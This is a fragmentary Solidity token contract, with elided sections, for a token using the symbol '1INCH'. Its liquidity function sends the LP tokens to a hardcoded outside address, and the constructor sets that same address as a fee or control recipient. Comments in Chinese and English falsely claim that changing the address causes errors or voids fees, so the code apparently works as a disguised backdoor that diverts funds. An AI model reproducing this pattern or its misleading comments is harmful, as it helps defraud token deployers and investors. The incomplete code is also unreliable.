        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x5e36F8c5d484A223FFd4357Ef54512C126079028), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        "1INCH",//Sy
        18,//De
        100000000,//Su 数量后面加20个0
        address(0x5e36F8c5d484A223FFd4357Ef54512C126079028),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x5e36F8c5d484A223FFd4357Ef54512C126079028)//
    ){
    }
}